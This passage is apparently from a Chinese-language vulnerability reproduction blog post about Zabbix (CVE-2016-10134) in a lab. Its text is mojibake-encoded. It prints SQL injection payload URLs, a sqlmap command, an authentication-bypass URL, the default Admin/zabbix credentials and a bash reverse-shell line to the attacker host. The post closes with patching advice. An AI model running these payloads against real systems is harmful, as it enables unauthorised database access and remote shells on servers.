alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\5a61b9f864ae44c59cba84f51235e012.png\"/></p>\n</blockquote>\n<h4><a id=\"sid_248\"></a>å¡«å……sidçš„å€¼ï¼Œå¯æˆåŠŸæ³¨å…¥</h4>\n<blockquote>\n<p>å°†è¿™16ä¸ªå­—ç¬¦ä½œä¸ºsidçš„å€¼ï¼Œè®¿é—®ï¼Œå¯è§æˆåŠŸæ³¨å…¥ï¼š</p>\n</blockquote>\n<h5><a id=\"_250\"></a>æŸ¥è¯¢æ•°æ®åº“å½“å‰ç”¨æˆ·ä¿¡æ¯</h5>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/latest.php?output<span class=\"token operator\">=</span>ajax<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">sid</span><span class=\"token operator\">=</span>916444579b8e84f1<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">favobj</span><span class=\"token operator\">=</span>toggle<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">toggle_open_state</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>toggle_ids<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>,concat<span class=\"token punctuation\">(</span>0xa,user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span>,0<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\c0892852688744e9bd2290918a01d26d.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\0a2c1ac489aa43fc80f4e6db6292a133.png\"/></p>\n<h5><a id=\"_258\"></a>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</h5>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/latest.php?output<span class=\"token operator\">=</span>ajax<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">sid</span><span class=\"token operator\">=</span>916444579b8e84f1<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">favobj</span><span class=\"token operator\">=</span>toggle<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">toggle_open_state</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>toggle_ids<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span>,concat<span class=\"token punctuation\">(</span>0x7e,<span class=\"token punctuation\">(</span>SELECT@@version<span class=\"token punctuation\">)</span>,0x7e<span class=\"token punctuation\">)</span>,1<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\99b6e224995f4ee3a2f4fd7740233ccd.png\"/></p>\n<h5><a id=\"Sqlmap_265\"></a>Sqlmapè‡ªåŠ¨åŒ–æ³¨å…¥</h5>\n<blockquote>\n<p>burpæŠ“åˆ°æ•°æ®åŒ…ï¼Œæ¡Œé¢æ–°å»ºtxtï¼ŒæŠŠæ•°æ®å†™å…¥txtã€‚<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\6e2b43335b9945178e9b8ec00fd5b523.png\"/></p>\n</blockquote>\n<pre><code class=\"prism language-bash\">python2 sqlmap.py -r C:<span class=\"token punctuation\">\\</span>è·¯å¾„<span class=\"token punctuation\">\\</span>æ–°å»ºæ–‡æœ¬æ–‡æ¡£.txt -p toggle_ids<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n-r æŒ‡å®šæ•°æ®åŒ…æ–‡ä»¶\n-p æŒ‡å®šæ³¨å…¥å­—æ®µ\n</code></pre>\n<blockquote>\n<p>txtæ–‡ä»¶ä¸sqlmapåœ¨åŒä¸€ç›®å½•ä¸‹æ—¶ä¸éœ€è¦åŠ è·¯å¾„ï¼Œè‹¥ä¸åœ¨åˆ™åŠ ç»å¯¹è·¯å¾„<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\2ece146f4c7a4884a18612848f2f8a1f.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\07299f1650bb4021b030b49e8eb284d2.png\"/></p>\n</blockquote>\n<blockquote>\n<p>Sqlmapçš„pocéƒ½å¯ä»¥ç”¨äºæ‰‹å·¥éªŒè¯</p>\n</blockquote>\n<h3><a id=\"2jsrpcphp_280\"></a>å¤ç°2ï¼ˆjsrpc.phpï¼‰</h3>\n<p>ã€‹è¿™ä¸ªæ¼æ´ä¹Ÿå¯ä»¥é€šè¿‡jsrpc.phpè§¦å‘ï¼Œä¸”æ— éœ€ç™»å½•ï¼š</p>\n<h4><a id=\"_282\"></a>æŸ¥è¯¢å½“å‰ä½¿ç”¨ç”¨æˆ·</h4>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/jsrpc.php?type<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">mode</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">method</span><span class=\"token operator\">=</span>screen.get<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx</span><span class=\"token operator\">=</span>web.item.graph<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">resourcetype</span><span class=\"token operator\">=</span><span class=\"token number\">17</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx2</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>,concat<span class=\"token punctuation\">(</span>0xa,user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span>,0<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\bc82a7d12bde4633bd5a1722a0c1ff13.png\"/></p>\n<h4><a id=\"_288\"></a>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</h4>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/jsrpc.php?type<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">mode</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">method</span><span class=\"token operator\">=</span>screen.get<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx</span><span class=\"token operator\">=</span>web.item.graph<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">resourcetype</span><span class=\"token operator\">=</span><span class=\"token number\">17</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx2</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span>,concat<span class=\"token punctuation\">(</span>0x7e,<span class=\"token punctuation\">(</span>SELECT@@version<span class=\"token punctuation\">)</span>,0x7e<span class=\"token punctuation\">)</span>,1<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\7b5c590d226a4e1c9a031bfed64d3eb9.png\"/></p>\n<h2><a id=\"4Zabbix_42__Authentication_Bypass_294\"></a>4.Zabbix 4.2 - Authentication Bypassç™»å½•ç»•è¿‡</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: phantasm<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nVulnType         <span class=\"token string\">\"poc-yaml-zabbix-authentication-bypass/default\"</span>\nlinks            <span class=\"token punctuation\">[</span><span class=\"token string\">\"https://www.exploit-db.com/exploits/47467\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h3><a id=\"links_301\"></a>å‚çœ‹linksï¼ˆå‚è€ƒé“¾æ¥ï¼‰</h3>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\1dc11b8dc50e4dd984b22e4519783326.png\"/></p>\n<blockquote>\n<p>å‘ç°æ˜¯ç™»é™†ç»•è¿‡</p>\n</blockquote>\n<h3><a id=\"POC_305\"></a>ä½¿ç”¨POCç»•è¿‡ç™»å½•</h3>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/zabbix.php?action<span class=\"token operator\">=</span>dashboard.view<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">dashboardid</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\f0e0342f0cd841399ca059a262127cc5.png\"/></p>\n<h2><a id=\"5_312\"></a>5.å­˜åœ¨é»˜è®¤å¯†ç </h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: phantasm<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nVulnType         <span class=\"token string\">\"poc-yaml-zabbix-default-password/default\"</span>\nlinks            <span class=\"token punctuation\">[</span><span class=\"token string\">\"https://www.zabbix.com/documentation/3.4/zh/manual/quickstart/login\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h3><a id=\"links_319\"></a>æŸ¥çœ‹linksï¼ˆå‚è€ƒé“¾æ¥ï¼‰</h3>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\1f85426b42084906b42a27d9349758eb.png\"/></p>\n<blockquote>\n<p>å‘ç°é»˜è®¤è´¦å·å¯†ç ï¼š<br/> é»˜è®¤è´¦å·Admin<br/> é»˜è®¤å¯†ç ä¸ºzabbix<br/> å¯†ç ç»è¿‡MD5åŠ å¯†åä¸º5fce1b3e34b520afeffb37ce08c7cd66</p>\n</blockquote>\n<h3><a id=\"_327\"></a>ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç ï¼Œç™»é™†æˆåŠŸ</h3>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/index.php\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\9159e73f482443328ee6a4e797469ad8.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\e774525e3f9640909f6c3e47cb0f88e7.png\"/></p>\n<h2><a id=\"6_336\"></a>6.æš´åŠ›ç ´è§£æ¼æ´</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: brute-force<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/index.php\"</span>\nVulnType         <span class=\"token string\">\"form-brute/default\"</span>\nfrom_url         <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nusername         map<span class=\"token punctuation\">[</span><span class=\"token string\">\"field\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"name\"</span> <span class=\"token string\">\"value\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">]</span>\npassw0rd         map<span class=\"token punctuation\">[</span><span class=\"token string\">\"field\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"passw0rd\"</span> <span class=\"token string\">\"value\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"passw0rd01\"</span><span class=\"token punctuation\">]</span>\nç”±äºCSDNæ£€æµ‹ä¸èƒ½å‡ºç°passw0rdï¼Œæ‰€ä»¥è¿™é‡Œçš„oæˆ‘æ”¹æˆäº†0\n</code></pre>\n<p>æ²¡æœ‰é˜²å¾¡æš´åŠ›ç ´è§£çš„æªæ–½ï¼Œç†è®ºä¸Šæ¥è¯´æ˜¯å¯ä»¥æš´åŠ›ç ´è§£è´¦å·å¯†ç çš„</p>\n<h1><a id=\"getshell_348\"></a>å…«ã€getshell</h1>\n<h2><a id=\"1_349\"></a>1.ç¯å¢ƒ</h2>\n<blockquote>\n<p>æ”»å‡»æœºï¼šwindowsæœ¬æœºï¼š192.168.13.1<br/> é¶æœºï¼škaliï¼š192.168.13.131</p>\n</blockquote>\n<h2><a id=\"2_352\"></a>2.åœ¨é¶æœºä¸Šå†™å…¥è„šæœ¬</h2>\n<blockquote>\n<p>ç”¨ä¸Šé¢ç®¡ç†å‘˜è´¦æˆ·å¯†ç ç™»å…¥åˆ°åå°ï¼ˆè´¦æˆ·æ˜¯Admin å¯†ç zabbixï¼‰<br/> ç™»å…¥ä¹‹åç‚¹Administrator-script-creatscriptï¼Œè¿›è¡Œå†™å…¥shell<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\c67b8060defa416c9680a6cd33b8d219.png\"/></p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">bash</span> -i <span class=\"token operator\">&gt;&amp;</span> /dev/tcp/192.168.13.1/55555 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&gt;</span><span class=\"token file-descriptor important\">&amp;1</span>\n</code></pre>\n<h2><a id=\"3_361\"></a>3.æ”»å‡»æœºç›‘å¬ï¼š</h2>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\69828a9e290442038ae30ee026881c26.png\"/></p>\n<h2><a id=\"4_364\"></a>4.é¶æœºè¿æ¥</h2>\n<blockquote>\n<p>æ‰¾è§¦å‘ç‚¹ï¼Œæ‰¾åˆ°è§¦å‘ç‚¹æ‰èƒ½æ‰§è¡Œã€‚æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œæ‹¿å¸¸ç”¨çš„ä¸¾ä¾‹ã€‚<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\e55456e3df494f12976dfdf3d500ef2f.png\"/></p>\n</blockquote>\n<blockquote>\n<p>æµè§ˆå™¨è·³è½¬ï¼Œæç¤ºæŠ¥é”™ä¿¡æ¯<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\7b8fc3222aa1469fab711d5718cd94c5.png\"/></p>\n</blockquote>\n<h2><a id=\"5Getshell_371\"></a>5.Getshellå¤±è´¥</h2>\n<blockquote>\n<p>è„šæœ¬ä¸€ç›´æ— æ³•æ‰§è¡Œï¼Œå¯èƒ½æ˜¯zabbixç¯å¢ƒå­˜åœ¨é—®é¢˜<br/> ç†è®ºä¸Šæ¥è¯´è„šæœ¬ä¸€ç›´æ— æ³•æ‰§è¡Œçš„ï¼Œæ˜¯å¯ä»¥getshellçš„<br/> åç»­æˆ‘ä¼šé‡æ–°æ­å»ºzabbixç¯å¢ƒè¿›è¡Œgetshellçš„å¤ç°ï¼Œä¸é€‰ç”¨vulhubç¯å¢ƒè¯•ä¸€ä¸‹ï¼Œå¦‚æœå¯ä»¥getshellæˆ‘å°†å†å‡ºç¯‡æ–‡ç« </p>\n</blockquote>\n<h1><a id=\"_376\"></a>ä¹ã€æ¼æ´ä¿®å¤ï¼š</h1>\n<blockquote>\n<p>ç¦ç”¨Guestè´¦æˆ·ï¼Œå…³é—­æ— ç”¨è´¦æˆ·ã€‚<br/> æ‰“è¡¥ä¸ï¼Œå‡çº§zabbixç‰ˆæœ¬ã€‚</p>\n</blockquote>\n<h1><a id=\"_380\"></a>åã€ç›¸åº”èµ„æº</h1>\n<p><a href=\"https://download.csdn.net/download/qq_51577576/86400304\">zabbix SQLæ³¨å…¥æ¼æ´ ï¼ˆCVE-2016-10134ï¼‰POC</a><br/> <a href=\"https://download.csdn.net/download/qq_51577576/86400303\">åŸæ–‡ä¸‹è½½</a></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}